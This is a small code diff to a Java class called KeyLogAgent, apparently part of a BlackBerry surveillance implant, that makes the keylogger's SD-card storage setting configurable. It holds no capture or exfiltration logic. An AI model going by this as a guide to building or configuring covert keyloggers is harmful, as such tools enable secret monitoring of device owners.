@@ -9,6 +9,7 @@
  * *************************************************/
 package blackberry.agent;
 
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
@@ -28,7 +29,7 @@ public final class KeyLogAgent extends Agent {
      *            the agent status
      */
     public KeyLogAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_KEYLOG, agentEnabled, true, "KeyLogAgent");
+        super(Agent.AGENT_KEYLOG, agentEnabled, Conf.AGENT_KEYLOG_ON_SD, "KeyLogAgent");
 
     }
 
